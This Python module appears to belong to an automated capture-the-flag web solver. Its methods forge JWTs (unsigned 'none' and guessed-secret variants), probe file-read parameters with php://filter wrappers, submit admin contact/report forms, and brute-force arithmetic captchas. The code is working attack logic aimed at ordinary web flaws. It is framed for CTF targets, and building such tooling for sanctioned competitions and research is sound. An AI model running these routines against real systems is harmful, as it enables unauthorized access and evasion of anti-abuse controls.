"""JWT manipulation / hint-followup / file-read / contact-report chain strategies.

Twenty-first P5 cut: a physically-contiguous, cohesive cluster of five
``_run_*`` strategy entrypoints plus the contact-submission helper trio
(originally ctf_dispatcher lines ~1581-2281). Methods are pure relocations;
``self.*`` resolves at runtime via the dispatcher's MRO, so call sites are
unchanged.
"""

from __future__ import annotations

import re
from typing import Any
from urllib.parse import urljoin, urlparse

from .chains.base import _ChainOutcome
from .dispatcher_helpers import (
    _base_target,
    _jwt_decode_payload,
    _jwt_encode,
    _jwt_get_unverified_header,
    _parse_forms_from_html,
    _solve_contact_captcha_solution,
    _solve_contact_pow_solution,
)

# only-this-cluster constant, moved here with the cluster (was ctf_dispatcher top)
_CONTACT_POW_CHALLENGE_RE = re.compile(r"\b(\d+_[A-Za-z0-9]+)\b")


class JWTContactChainMixin:
    """JWT / hint / file-read / contact-report strategy entrypoints."""

    async def _run_jwt_manipulation_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        candidates = self._collect_candidate_jwts(target, page_features)
        if not candidates:
            return _ChainOutcome(progress=False, reason="jwt_manipulation: no candidate token found")

        progress = False
        reasons: list[str] = []
        target_candidates = self._jwt_target_candidates(base, page_features)
        for candidate in candidates:
            token = str(candidate.get("token") or "").strip()
            if not token:
                continue
            try:
                header = _jwt_get_unverified_header(token)
                payload = _jwt_decode_payload(token)
            except Exception:
                continue

            mutated_payloads = self._jwt_mutation_candidates(payload)
            algorithm_order = self._jwt_algorithm_candidates(header)
            secrets = self._jwt_secret_candidates()
            for payload_variant in mutated_payloads:
                for algorithm in algorithm_order:
                    signed_variants: list[str] = []
                    if algorithm == "none":
                        signed_variants.append(self._encode_none_jwt(payload_variant))
                    else:
                        for secret in secrets:
                            try:
                                signed_variants.append(
                                    _jwt_encode(payload_variant, secret, algorithm)
                                )
                            except Exception:
                                continue
                    for mutated_token in signed_variants:
                        for headers in self._jwt_request_headers(candidate, mutated_token):
                            for request_target in target_candidates:
                                try:
                                    resp = await self.runtime.proxy_action(
                                        "get",
                                        url=request_target,
                                        headers=headers,
                                        timeout=10,
                                    )
                                except Exception:
                                    continue
                                if not isinstance(resp, dict) or resp.get("error"):
                                    continue
                                status = int(resp.get("status_code") or 0)
                                body = str(resp.get("body") or "")
                                progress = progress or status in {200, 302}
                                if self.state is not None:
                                    self.state.add_observation(
                                        "jwt_probe_response",
                                        body[:300],
                                        source="jwt_manipulation",
                                        metadata={
                                            "algorithm": algorithm,
                                            "status_code": status,
                                            "url": request_target,
                                            "header_keys": sorted(headers.keys()),
                                            "payload_keys": sorted(payload_variant.keys()),
                                        },
                                    )
                                if body:
                                    await self._scan_and_store(body, request_target, evidence_source="response_body")
                                flag = self._extract_flag(body)
                                if flag:
                                    verification = await self._observe_flag(
                                        flag,
                                        request_target,
                                        evidence_source="response_body",
                                        rationale=f"jwt_manipulation via {algorithm}",
                                    )
                                    if verification.decision in {"verified", "runtime"}:
                                        return _ChainOutcome(
                                            progress=True,
                                            flag=verification.flag,
                                            reason=f"jwt_manipulation flag via {algorithm}",
                                        )
                                if status in {200, 302}:
                                    reasons.append(f"jwt {algorithm} changed status to {status} at {request_target}")
        return _ChainOutcome(progress=progress, reason="; ".join(dict.fromkeys(reasons[:4])) or "jwt_manipulation exhausted")

    async def _run_hint_chain_followup_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """
        Input:  target URL + page_features（含 raw_links / endpoints）
        Output: _ChainOutcome；副作用：将提示文件内容写入 state.observations
        Success: 从提示文件发现 flag 或关键规则（hash 算法等）
        Failure: 提示文件均 404 或空；上层 web 链继续下一策略
        """
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        # 构造候选提示文件列表（从 raw_links / endpoints / 固定路径）
        hint_paths: list[str] = ["/hints.txt", "/welcome.txt", "/flag.txt"]
        for path in list(page_features.get("endpoints") or []):
            if any(t in path.lower() for t in ("/hint", "/welcome", "/flag.txt")):
                if path not in hint_paths:
                    hint_paths.append(path)
        # raw_links 中带完整路径的提示文件
        for raw in page_features.get("raw_links") or []:
            parsed_path = urlparse(raw).path
            if any(t in parsed_path.lower() for t in ("/hints.txt", "/welcome.txt", "/flag.txt")):
                if parsed_path not in hint_paths:
                    hint_paths.append(parsed_path)

        progress = False
        reasons: list[str] = []

        for path in hint_paths:
            url = urljoin(base + "/", path.lstrip("/"))
            try:
                resp = await self.runtime.proxy_action("get", url=url, timeout=10)
            except Exception:
                continue
            if not isinstance(resp, dict) or resp.get("error"):
                continue
            status = int(resp.get("status_code") or 0)
            body = str(resp.get("body") or "")
            if status == 200 and body:
                progress = True
                reasons.append(f"{path}: {body[:120].strip()}")
                if self.state is not None:
                    self.state.add_observation(
                        "hint_file_content",
                        body,
                        source="hint_chain_followup",
                        metadata={"url": url, "path": path, "status_code": status},
                    )
                    # 标记 agenda 中对应条目为已探索
                    for item in self.state.exploration_agenda:
                        if item.url_or_path in (path, url):
                            item.explored = True
                            item.exploration_result = f"status=200 body_len={len(body)}"
                # 检查是否直接包含 flag
                flag = self._extract_flag(body)
                if flag:
                    verification = await self._observe_flag(
                        flag, base,
                        evidence_source="response_body",
                        rationale=f"hint file: {path}",
                    )
                    if verification.decision in {"verified", "runtime"}:
                        return _ChainOutcome(
                            progress=True,
                            flag=verification.flag,
                            reason=f"hint file flag: {path}",
                        )
                await self._scan_and_store(
                    body,
                    url,
                    evidence_source="response_body",
                    page_features=page_features,
                )

        return _ChainOutcome(progress=progress, reason="; ".join(reasons[:3]))

    async def _run_file_read_endpoint_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """
        Input:  target URL + page_features
        Output: _ChainOutcome；副作用：写入 observations
        Success: 响应包含 flag 或错误信息暗示 hash 规则
        Failure: 所有 URL 均无有用响应；上层继续
        """
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        raw_links = list(page_features.get("raw_links") or [])
        # 带 file/path/filename 等参数的完整 URL 优先
        file_urls: list[str] = [
            u
            for u in raw_links
            if any(token in u.lower() for token in ("filename=", "?file=", "&file=", "?path=", "&path=", "?page=", "&page=", "?include=", "&include="))
        ]
        # 尝试直接 GET（不带正确 hash）触发错误信息
        for filename in ("/flag.txt", "/hints.txt", "/welcome.txt"):
            probe = urljoin(base + "/", f"file?filename={filename}")
            if probe not in file_urls:
                file_urls.append(probe)

        # 对二级提示里挖出的 ?file=flag.php 一类面，继续尝试 php://filter 读取源码
        for candidate in list(file_urls):
            for wrapper_url in self._build_file_wrapper_urls(candidate):
                if wrapper_url not in file_urls:
                    file_urls.append(wrapper_url)

        progress = False
        reasons: list[str] = []

        for url in file_urls[:12]:
            try:
                resp = await self.runtime.proxy_action("get", url=url, timeout=10)
            except Exception:
                continue
            if not isinstance(resp, dict) or resp.get("error"):
                continue
            body = str(resp.get("body") or "")
            status = int(resp.get("status_code") or 0)
            final_url = str(resp.get("final_url") or url)
            redirect_history = list(resp.get("redirect_history") or [])
            if not body:
                continue
            progress = True
            reasons.append(f"file_read {urlparse(url).path}: status={status}")
            if self.state is not None:
                self.state.add_observation(
                    "file_read_response",
                    body[:500],
                    source="file_read_endpoint",
                    metadata={
                        "url": url,
                        "status_code": status,
                        "final_url": final_url,
                        "redirect_history": redirect_history,
                    },
                )
                if final_url != url or redirect_history:
                    self.state.add_observation(
                        "file_read_redirect",
                        final_url,
                        source="file_read_endpoint",
                        metadata={
                            "url": url,
                            "status_code": status,
                            "redirect_history": redirect_history,
                        },
                    )
            flag = self._extract_flag(body)
            if flag:
                verification = await self._observe_flag(
                    flag, base,
                    evidence_source="response_body",
                    rationale=f"file read: {url}",
                )
                if verification.decision in {"verified", "runtime"}:
                    return _ChainOutcome(progress=True, flag=verification.flag, reason="file read flag")
            await self._scan_and_store(
                body,
                final_url or url,
                evidence_source="response_body",
                page_features=page_features,
            )
            if decoded := self._decode_base64_source_blob(body):
                if self.state is not None:
                    self.state.add_observation(
                        "decoded_source_blob",
                        decoded[:1200],
                        source="file_read_endpoint",
                        metadata={
                            "url": final_url or url,
                            "decoded_from_base64": True,
                            "web_subtype": ["source_leak"],
                        },
                    )
                if decoded_flag := self._extract_flag(decoded):
                    verification = await self._observe_flag(
                        decoded_flag,
                        base,
                        evidence_source="response_body",
                        rationale=f"decoded runtime source leak: {final_url or url}",
                        evidence_url=final_url or url,
                        evidence_snippet=decoded[:240],
                        replayable=True,
                    )
                    if verification.decision in {"verified", "runtime"}:
                        return _ChainOutcome(
                            progress=True,
                            flag=verification.flag if verification.decision == "verified" else None,
                            reason="file read decoded source flag",
                        )
                await self._scan_and_store(
                    decoded,
                    final_url or url,
                    evidence_source="source-leak",
                    page_features=page_features,
                )

        return _ChainOutcome(progress=progress, reason="; ".join(reasons[:3]))

    async def _run_contact_report_chain_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """
        Input:  target URL + page_features（含登录后 raw_links / forms）
        Output: _ChainOutcome；副作用：写入 observations / blocked surface
        Success: 至少进入 /contact 并完成一次真实提交，或确认 report 已提交
        Failure: 被 captcha/pow 阻塞时记录统一失败回显，供 recovery/reasoning 反证降权
        """
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        strategy_kind = "contact_report_chain"
        if self._has_prior_contact_report_submission():
            return _ChainOutcome(progress=False, reason="contact/report already submitted")

        candidate_urls: list[str] = []
        seen: set[str] = set()
        seeded_candidates = ["/contact", "contact", "/report", "report"]
        explicit_contact_links = [
            str(raw or "").strip()
            for raw in (page_features.get("raw_links") or [])
            if any(token in str(raw or "").lower() for token in ("/contact", "/report"))
        ]
        for raw in [*seeded_candidates, *explicit_contact_links]:
            text = str(raw or "").strip()
            if not text:
                continue
            absolute = text if text.startswith(("http://", "https://")) else urljoin(base + "/", text.lstrip("/"))
            if absolute in seen:
                continue
            seen.add(absolute)
            candidate_urls.append(absolute)

        contact_url = ""
        contact_form: dict[str, Any] | None = None
        contact_body = ""
        contact_status = 0

        for url in candidate_urls:
            try:
                resp = await self.runtime.proxy_action("get", url=url, timeout=12)
            except Exception:
                continue
            if not isinstance(resp, dict) or resp.get("error"):
                continue
            body = str(resp.get("body") or "")
            status = int(resp.get("status_code") or 0)
            final_url = str(resp.get("final_url") or url).strip() or url
            if status != 200 or not body:
                continue
            lowered = body.lower()
            final_path = urlparse(final_url).path.lower()
            forms = _parse_forms_from_html(body, final_url)
            strong_contact_signal = (
                "/contact" in final_path
                or "/report" in final_path
                or any(
                    token in lowered
                    for token in (
                        "/static/pow.py",
                        "/static/vpow.py",
                        "captcha",
                        "contact admin",
                        "admin defaultly only sees",
                        "proof of work",
                    )
                )
            )
            if strong_contact_signal:
                contact_url = final_url
                contact_body = body
                contact_status = status
                contact_form = forms[0] if forms else None
                break

        if not contact_url or not contact_body:
            return _ChainOutcome(progress=False, reason="contact page not discovered")

        await self._scan_and_store(
            contact_body,
            contact_url,
            evidence_source="response_body",
            page_features=page_features,
        )
        if self.state is not None:
            self.state.add_observation(
                "contact_surface",
                contact_url,
                source=strategy_kind,
                metadata={
                    "status_code": contact_status,
                    "has_form": bool(contact_form),
                    "candidate_urls": list(candidate_urls),
                },
            )

        if contact_form is None:
            if self.state is not None:
                await self._record_uniform_failure_surface(
                    "contact page missing actionable form",
                    source=strategy_kind,
                    metadata={
                        "strategy_kind": strategy_kind,
                        "reason": "contact page discovered but no actionable form parsed",
                        "contact_url": contact_url,
                    },
                )
            return _ChainOutcome(progress=True, reason="contact page found but no actionable form")

        submission: dict[str, str] = {}
        desc_field = ""
        url_field = ""
        captcha_fields: list[str] = []
        captcha_answer_fields: list[str] = []
        pow_fields: list[str] = []

        for inp in contact_form.get("inputs") or []:
            if not isinstance(inp, dict):
                continue
            name = str(inp.get("name") or "").strip()
            if not name:
                continue
            field_type = str(inp.get("type") or "text").strip().lower()
            value = str(inp.get("value") or "")
            lowered_name = name.lower()

            if field_type in {"submit", "button", "image", "reset", "file"}:
                continue
            if field_type == "hidden":
                submission[name] = value
                if "captcha" in lowered_name:
                    captcha_fields.append(name)
                continue

            if any(token in lowered_name for token in ("desc", "message", "content", "text")) and not desc_field:
                desc_field = name
                submission[name] = "ctf probe report"
                continue
            if lowered_name == "url" or lowered_name.endswith("url"):
                url_field = name
                submission[name] = base + "/"
                continue
            if "captcha" in lowered_name:
                captcha_fields.append(name)
                captcha_answer_fields.append(name)
                submission[name] = value
                continue
            if "pow" in lowered_name:
                pow_fields.append(name)
                submission[name] = value
                continue
            submission[name] = value

        if self.state is not None:
            self.state.add_observation(
                "contact_form_detected",
                contact_url,
                source=strategy_kind,
                metadata={
                    "fields": sorted(submission.keys()),
                    "desc_field": desc_field,
                    "url_field": url_field,
                    "captcha_fields": sorted(captcha_fields),
                    "captcha_answer_fields": sorted(captcha_answer_fields),
                    "pow_fields": sorted(pow_fields),
                },
            )

        captcha_solution = await _solve_contact_captcha_solution(
            self.runtime,
            contact_body,
            contact_url,
        )
        if captcha_solution is not None and captcha_answer_fields:
            for field_name in captcha_answer_fields:
                submission[field_name] = str(captcha_solution)
            if self.state is not None:
                self.state.add_observation(
                    "contact_captcha_solved",
                    str(captcha_solution),
                    source=strategy_kind,
                    metadata={
                        "contact_url": contact_url,
                        "fields": sorted(captcha_answer_fields),
                        "preserved_fields": sorted(
                            field_name for field_name in captcha_fields if field_name not in captcha_answer_fields
                        ),
                    },
                )

        pow_challenge_match = _CONTACT_POW_CHALLENGE_RE.search(contact_body)
        if pow_challenge_match and pow_fields:
            pow_solution = _solve_contact_pow_solution(pow_challenge_match.group(1))
            if pow_solution is not None:
                for field_name in pow_fields:
                    submission[field_name] = str(pow_solution)
                if self.state is not None:
                    self.state.add_observation(
                        "contact_pow_solved",
                        str(pow_solution),
                        source=strategy_kind,
                        metadata={
                            "contact_url": contact_url,
                            "challenge": pow_challenge_match.group(1),
                            "fields": sorted(pow_fields),
                        },
                    )

        response, request_url = await self._submit_form_request(contact_url, contact_form, submission)
        body = str((response or {}).get("body") or "")
        status = int((response or {}).get("status_code") or 0)
        final_url = str((response or {}).get("final_url") or request_url or contact_url).strip() or contact_url
        await self._scan_and_store(body, final_url, evidence_source="http-response")

        lowered_body = body.lower()
        invalid_captcha = "invalid captcha" in lowered_body
        pow_required = (
            "pow" in lowered_body
            and any(token in lowered_body for token in ("invalid", "required", "missing", "wrong"))
        )
        submitted_signal = self._is_contact_submission_success(
            response=response,
            body=body,
            final_url=final_url,
        )

        if invalid_captcha and captcha_answer_fields:
            brute_force_result = await self._attempt_contact_captcha_bypass(
                contact_url=contact_url,
                contact_form=contact_form,
                submission=submission,
                captcha_fields=captcha_answer_fields,
                strategy_kind=strategy_kind,
            )
            if brute_force_result is not None:
                response, request_url, bypass_value = brute_force_result
                body = str((response or {}).get("body") or "")
                status = int((response or {}).get("status_code") or 0)
                final_url = str((response or {}).get("final_url") or request_url or contact_url).strip() or contact_url
                await self._scan_and_store(body, final_url, evidence_source="http-response")
                lowered_body = body.lower()
                invalid_captcha = "invalid captcha" in lowered_body
                pow_required = (
                    "pow" in lowered_body
                    and any(token in lowered_body for token in ("invalid", "required", "missing", "wrong"))
                )
                submitted_signal = self._is_contact_submission_success(
                    response=response,
                    body=body,
                    final_url=final_url,
                )
                if self.state is not None:
                    self.state.add_observation(
                        "contact_captcha_bypass",
                        str(bypass_value),
                        source=strategy_kind,
                        metadata={
                            "contact_url": contact_url,
                            "request_url": request_url,
                            "status_code": status,
                            "fields": sorted(captcha_fields),
                        },
                    )

        blocker_reasons: list[str] = []
        if invalid_captcha:
            blocker_reasons.append("invalid captcha")
        if pow_required:
            blocker_reasons.append("pow required")
        if (captcha_fields or pow_fields) and not submitted_signal and not blocker_reasons:
            blocker_reasons.append("captcha/pow gated form")

        if blocker_reasons:
            blocker_reason = ", ".join(blocker_reasons)
            await self._store_note(
                key="ctf_contact_blocker",
                value=f"{contact_url} blocked by {blocker_reason}",
                category="finding",
                target=urlparse(base).netloc or base,
                url=contact_url,
            )
            if self.state is not None:
                await self._record_uniform_failure_surface(
                    blocker_reason,
                    source=strategy_kind,
                    metadata={
                        "strategy_kind": strategy_kind,
                        "reason": blocker_reason,
                        "contact_url": contact_url,
                        "request_url": request_url,
                        "status_code": status,
                        "captcha_fields": sorted(captcha_fields),
                        "pow_fields": sorted(pow_fields),
                    },
                )
            return _ChainOutcome(progress=True, reason=f"contact blocked: {blocker_reason}")

        if submitted_signal:
            await self._store_note(
                key="ctf_contact_submission",
                value=f"submitted contact/report form at {contact_url}",
                category="finding",
                target=urlparse(base).netloc or base,
                url=contact_url,
            )
            if self.state is not None:
                self.state.add_observation(
                    "contact_report_submitted",
                    contact_url,
                    source=strategy_kind,
                    metadata={
                        "request_url": request_url,
                        "status_code": status,
                        "final_url": final_url,
                    },
                )
            return _ChainOutcome(progress=True, reason="contact/report form submitted")

        return _ChainOutcome(progress=True, reason=f"contact form attempted: status={status}")

    def _has_prior_contact_report_submission(self) -> bool:
        state = getattr(self, "state", None)
        for observation in list(getattr(state, "observations", []) or []):
            if str(getattr(observation, "kind", "") or "").strip() != "contact_report_submitted":
                continue
            metadata = getattr(observation, "metadata", None)
            if not isinstance(metadata, dict):
                return True
            if str(metadata.get("status_code") or "").strip():
                return True
        return False

    def _is_contact_submission_success(
        self,
        *,
        response: dict[str, Any] | None,
        body: str,
        final_url: str,
    ) -> bool:
        lowered_body = str(body or "").lower()
        if any(
            token in lowered_body
            for token in ("thank", "queued", "reported", "sent", "submitted", "admin will")
        ):
            return True

        headers = (response or {}).get("headers") or {}
        if str(headers.get("location") or "").strip():
            return True

        final_path = urlparse(str(final_url or "")).path.lower()
        if final_path.endswith("/urlstorage"):
            if any(
                token in lowered_body
                for token in ("store your url", "get flag", "save changes", "logout")
            ):
                return True
        return False

    async def _attempt_contact_captcha_bypass(
        self,
        *,
        contact_url: str,
        contact_form: dict[str, Any],
        submission: dict[str, str],
        captcha_fields: list[str],
        strategy_kind: str,
        max_guess: int = 81,
    ) -> tuple[dict[str, Any], str, int] | None:
        """Fallback for arithmetic-style captcha when OCR is missing or wrong."""
        if not captcha_fields:
            return None

        base_submission = dict(submission)
        for guess in range(0, max_guess + 1):
            candidate_submission = dict(base_submission)
            for field_name in captcha_fields:
                candidate_submission[field_name] = str(guess)
            response, request_url = await self._submit_form_request(
                contact_url,
                contact_form,
                candidate_submission,
            )
            body = str((response or {}).get("body") or "")
            lowered_body = body.lower()
            invalid_captcha = "invalid captcha" in lowered_body
            submitted_signal = self._is_contact_submission_success(
                response=response,
                body=body,
                final_url=str((response or {}).get("final_url") or request_url or contact_url),
            )
            if submitted_signal:
                return response, request_url, guess
            if not invalid_captcha:
                if self.state is not None:
                    self.state.add_observation(
                        "contact_captcha_bypass_progress",
                        str(guess),
                        source=strategy_kind,
                        metadata={
                            "contact_url": contact_url,
                            "request_url": request_url,
                            "guess": guess,
                        },
                    )
                return response, request_url, guess
        return None

